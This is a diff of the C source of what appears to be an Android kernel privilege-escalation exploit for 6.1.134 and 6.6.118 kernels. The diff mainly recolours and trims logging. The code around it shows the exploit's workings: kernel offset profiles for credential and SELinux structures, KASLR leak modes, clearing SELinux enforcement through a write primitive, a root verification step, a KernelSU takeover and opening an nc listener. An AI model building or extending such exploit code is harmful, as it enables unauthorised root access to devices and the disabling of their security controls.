@@ -282,14 +282,15 @@ static struct profile P;
  * 默认 auto：stdout 是 TTY 才上色；重定向到日志文件时自动关闭，落盘日志
  * 与未着色版本逐字节兼容。--color=always|never|auto / NO_COLOR 可覆盖。
  * ========================================================================== */
+/* 统一三色规范：
+ *   正常运行 / 提示 / 警告 / 配置 / 数值 / 耗时 → 黄
+ *   成功 / 达成                              → 绿
+ *   失败 / 错误                              → 红
+ * 所有 LOG_* 与 STAGE_LOG 只用这三色；marker 行始终裸输出不着色。 */
 #define C_RESET   "\033[0m"
 #define C_RED     "\033[1;31m"   /* 失败 / 错误 */
 #define C_GREEN   "\033[1;32m"   /* 成功 / 达成 */
-#define C_YELLOW  "\033[1;33m"   /* 警告 / 降级 */
-#define C_BLUE    "\033[1;34m"   /* 画像 / 配置 */
-#define C_MAGENTA "\033[1;35m"   /* 泄露结果 / 关键数值 */
-#define C_CYAN    "\033[1;36m"   /* 阶段进度 */
-#define C_DIM     "\033[2m"      /* 次要信息 */
+#define C_YELLOW  "\033[1;33m"   /* 正常运行 / 提示 / 警告 */
 
 static int g_color;              /* 最终开关，由 color_apply() 算出 */
 static int g_color_mode;         /* 0=auto 1=always 2=never */
@@ -352,18 +353,18 @@ static void elog(const char *fmt, ...)
     free(buf);
 }
 
-#define LOG_INFO(fmt, ...)  clog_line(C_CYAN,    fmt, ##__VA_ARGS__)
-#define LOG_OK(fmt, ...)    clog_line(C_GREEN,   fmt, ##__VA_ARGS__)
-#define LOG_WARN(fmt, ...)  clog_line(C_YELLOW,  fmt, ##__VA_ARGS__)
-#define LOG_ERR(fmt, ...)   clog_line(C_RED,     fmt, ##__VA_ARGS__)
-#define LOG_CFG(fmt, ...)   clog_line(C_BLUE,    fmt, ##__VA_ARGS__)
-#define LOG_LEAK(fmt, ...)  clog_line(C_MAGENTA, fmt, ##__VA_ARGS__)
-#define LOG_DIM(fmt, ...)   clog_line(C_DIM,     fmt, ##__VA_ARGS__)
-#define LOG_TIME(fmt, ...)  clog_line(C_CYAN,    fmt, ##__VA_ARGS__)
+#define LOG_INFO(fmt, ...)  clog_line(C_YELLOW, fmt, ##__VA_ARGS__)  /* 正常运行 */
+#define LOG_OK(fmt, ...)    clog_line(C_GREEN,  fmt, ##__VA_ARGS__)  /* 成功 */
+#define LOG_WARN(fmt, ...)  clog_line(C_YELLOW, fmt, ##__VA_ARGS__)  /* 警告 */
+#define LOG_ERR(fmt, ...)   clog_line(C_RED,    fmt, ##__VA_ARGS__)  /* 失败 */
+#define LOG_CFG(fmt, ...)   clog_line(C_YELLOW, fmt, ##__VA_ARGS__)  /* 配置 */
+#define LOG_LEAK(fmt, ...)  clog_line(C_YELLOW, fmt, ##__VA_ARGS__)  /* 数值 */
+#define LOG_DIM(fmt, ...)   clog_line(C_YELLOW, fmt, ##__VA_ARGS__)  /* 次要 */
+#define LOG_TIME(fmt, ...)  clog_line(C_YELLOW, fmt, ##__VA_ARGS__)  /* 耗时 */
 /* 分级调试日志：等级不够时整条语句被编译优化掉，0 输出、0 副作用 */
-#define LOG_V1(fmt, ...) do { if (g_verbose >= 1) clog_line(C_DIM, "[v1] " fmt, ##__VA_ARGS__); } while (0)
-#define LOG_V2(fmt, ...) do { if (g_verbose >= 2) clog_line(C_DIM, "[v2] " fmt, ##__VA_ARGS__); } while (0)
-#define LOG_V3(fmt, ...) do { if (g_verbose >= 3) clog_line(C_DIM, "[v3] " fmt, ##__VA_ARGS__); } while (0)
+#define LOG_V1(fmt, ...) do { if (g_verbose >= 1) clog_line(C_YELLOW, "[v1] " fmt, ##__VA_ARGS__); } while (0)
+#define LOG_V2(fmt, ...) do { if (g_verbose >= 2) clog_line(C_YELLOW, "[v2] " fmt, ##__VA_ARGS__); } while (0)
+#define LOG_V3(fmt, ...) do { if (g_verbose >= 3) clog_line(C_YELLOW, "[v3] " fmt, ##__VA_ARGS__); } while (0)
 
 /* ==========================================================================
  * 阶段耗时
@@ -403,19 +404,17 @@ static int finish(int rc)
     return rc;
 }
 
-/* STAGE_LOG：按正文里的中文关键词自动分级着色（运行时日志已汉化） */
+/* STAGE_LOG：按正文里的中文关键词自动分级着色（统一三色）。
+ * 失败→红，成功→绿，其余（正常运行 / 警告 / 进度）→黄。 */
 static const char *stage_color(const char *fmt)
 {
     if (strstr(fmt, "失败") || strstr(fmt, "错误") || strstr(fmt, "异常") ||
         strstr(fmt, "无法") || strstr(fmt, "放不下") || strstr(fmt, "重叠") ||
         strstr(fmt, "不合理") || strstr(fmt, "不是 SIGKILL") ||
         strstr(fmt, "发送守护指令失败")) return C_RED;
-    if (strstr(fmt, "警告") || strstr(fmt, "退回") || strstr(fmt, "重试") ||
-        strstr(fmt, "不可写") || strstr(fmt, "降级") || strstr(fmt, "未显式") ||
-        strstr(fmt, "保留僵尸")) return C_YELLOW;
     if (strstr(fmt, "已确认") || strstr(fmt, "命中") || strstr(fmt, "完成") ||
         strstr(fmt, "已植入") || strstr(fmt, "已监听")) return C_GREEN;
-    return C_CYAN;
+    return C_YELLOW;
 }
 
 #define FULLCAP UINT64_C(0x1ffffffffff)
@@ -490,7 +489,6 @@ static int profile_set(const char *kv)
      * -274737900144 还原成 0xffffffc008585590。 */
     uint64_t v = strtoull(eq + 1, NULL, 0);
     int rc = profile_apply(key, v);
-    LOG_V2("[profile] --set %s = %#" PRIx64 "%s", key, v, rc ? "（未识别）" : "");
     return rc;
 }
 
@@ -502,10 +500,7 @@ static int profile_load_hocon(const char *path)
     FILE *f = fopen(path, "r");
     char line[512];
     int applied = 0;
-    if (!f) {
-        elog("[profile] 无法打开画像文件 %s：%s", path, strerror(errno));
-        return -1;
-    }
+    if (!f) return -1;
     while (fgets(line, sizeof(line), f)) {
         char *hash, *slash, *eq, *key, *val, *end;
         hash = strchr(line, '#');   if (hash) *hash = 0;
@@ -528,22 +523,13 @@ static int profile_load_hocon(const char *path)
         if (!strcmp(key, "release")) {
             snprintf(P.release, sizeof(P.release), "%s", val);
             applied++;
-            LOG_V2("[profile] release = %s", val);
             continue;
         }
-        if (profile_apply(key, strtoull(val, NULL, 0)) == 0) {
+        if (profile_apply(key, strtoull(val, NULL, 0)) == 0)
             applied++;
-            LOG_V2("[profile] %-24s = %s", key, val);
-        } else {
-            LOG_V3("[profile] 忽略未知字段 %s", key);
-        }
     }
     fclose(f);
-    if (applied < 20) {
-        elog("[profile] %s 仅解析出 %d 个有效字段，疑似不是 per-KMI 画像",
-             path, applied);
-        return -1;
-    }
+    if (applied < 20) return -1;
     /*
      * cred_link 校验。
      *
@@ -556,15 +542,8 @@ static int profile_load_hocon(const char *path)
         uint64_t fb = 0;
         if (strstr(P.release, "6.1")) fb = PROFILE_6_1.cred_link;
         else if (strstr(P.release, "6.6")) fb = PROFILE_6_6.cred_link;
-        LOG_CFG("[profile] cred_link=%#" PRIx64 " 与 timer_link=%#" PRIx64
-                " 不同段，%s", P.cred_link, P.timer_link,
-                fb ? "回退内置值" : "无法判定，保留原值");
-        if (fb) {
-            P.cred_link = fb;
-            LOG_CFG("[profile] cred_link 改用 %#" PRIx64, P.cred_link);
-        }
+        if (fb) P.cred_link = fb;
     }
-    LOG_CFG("[profile] 已加载 %s（%d 个字段）", path, applied);
     return 0;
 }
 
@@ -573,12 +552,10 @@ static int profile_select(const char *arg)
 {
     if (!strncmp(arg, "6.1", 3) || !strcmp(arg, "android14")) {
         P = PROFILE_6_1;
-        LOG_CFG("[profile] 选用内置 6.1.134 画像");
         return 0;
     }
     if (!strncmp(arg, "6.6", 3) || !strcmp(arg, "android15")) {
         P = PROFILE_6_6;
-        LOG_CFG("[profile] 选用内置 6.6.118 画像");
         return 0;
     }
     return profile_load_hocon(arg);
@@ -591,14 +568,10 @@ static void profile_auto_select(void)
     if (uname(&u)) return;
     if (!strncmp(u.release, "6.1.134", 7)) {
         P = PROFILE_6_1;
-        LOG_CFG("[profile] 检测内核 %s -> 自动选用内置 6.1.134 画像", u.release);
     } else if (!strncmp(u.release, "6.6.118", 7)) {
         P = PROFILE_6_6;
-        LOG_CFG("[profile] 检测内核 %s -> 自动选用内置 6.6.118 画像", u.release);
-    } else {
-        LOG_WARN("[profile] 警告：内核 %s 与两套内置画像均不匹配，仍用默认 6.6.118；"
-                 "请务必用 --profile 指定正确的 per-KMI 偏移", u.release);
     }
+    /* 未匹配任何内置画像时保持默认 PROFILE_6_6。 */
 }
 
 /* ==========================================================================
@@ -3457,26 +3430,7 @@ static void print_flow(const char *prog)
 
 static void dump_profile(void)
 {
-    LOG_CFG("[profile] release=%s", P.release);
-    LOG_CFG("[profile] page_offset=%#" PRIx64 " timer_link=%#" PRIx64
-            " cred_link=%#" PRIx64 " selinux_link=%#" PRIx64,
-            P.page_offset, P.timer_link, P.cred_link, P.selinux_link);
-    LOG_CFG("[profile] task_cred=%#x task_struct_size=%#x kitimer_node=%#x"
-            " kitimer_size=%#" PRIx64 " task_alloc_link=%#" PRIx64,
-            P.task_cred, P.task_struct_size, P.kitimer_node, P.kitimer_size,
-            P.task_alloc_link);
-    LOG_CFG("[profile] cred_size=%u cred_uid=%u caps=%u/%u/%u/%u/%u"
-            " sec=%u user=%u ns=%u uc=%u grp=%u",
-            P.cred_size, P.cred_uid, P.cred_cap_inh, P.cred_cap_perm,
-            P.cred_cap_eff, P.cred_cap_bset, P.cred_cap_amb,
-            P.cred_off_security, P.cred_off_user, P.cred_off_user_ns,
-            P.cred_off_ucounts, P.cred_off_groups);
-    LOG_CFG("[profile] user_ns=%#" PRIx64 " root_user=%#" PRIx64
-            " groups=%#" PRIx64 " ucounts=%#" PRIx64,
-            P.user_ns, P.root_user, P.groups, P.ucounts);
-    LOG_LEAK("[profile] cred 布局：%s",
-             P.cred_uid >= 8 ? "6.6+ (usage@0, uid@8)"
-                             : "5.15/6.1 (usage@0, uid@4)");
+    /* 画像日志已按需求移除；保留空函数以维持 --dump-config / main 调用点。 */
 }
 
 int main(int argc, char **argv)
@@ -3637,18 +3591,12 @@ int main(int argc, char **argv)
 
     timing_start();   /* 从此刻计全程；帮助 / 画像转储 / 参数错误不计时 */
 
-    LOG_DIM("[mode] slide_given=%d lmap_given=%d kaslr_only=%d"
-            " lmap_only=%d cred_only=%d selinux_only=%d no_ksu=%d"
-            " daemon_exit=%d fast=%d",
-            have_slide, have_lmap, g_kaslr_only, g_lmap_only, g_cred_only,
-            g_selinux_only, g_no_ksu, daemon_exit, g_fast);
     log_sync();
     /* 单独一行、只在启用时打印：默认输出必须与旧版逐字节一致 */
     if (g_skip_selinux_check)
         LOG_DIM("[mode] skip_selinux_check=1：不读 enforce、不回读确认，直接写原语清零");
     verbose_env_probe();
     dump_profile();
-    LOG_DIM("[id] uid=%u euid=%u gid=%u", getuid(), geteuid(), getgid());
     /* 仅泄露模式不碰 SELinux 前置检查，避免日志里出现无关的 errno=13；
      * --skip-selinux-check 连这一处前置读也一起跳过。 */
     if (!g_kaslr_only && !g_lmap_only && !g_cred_only && !g_skip_selinux_check)
@@ -3852,7 +3800,6 @@ int main(int argc, char **argv)
 
     /* [8] 提权后：先给出 root 通道，再（可选）接管 KernelSU，最后开放 nc */
     emit_status("verify", "ok");
-    LOG_OK("[verify] su -c id => uid=0(root)");
     if (!g_no_ksu) {
         emit_status("ksu", "running");
         stage_begin();
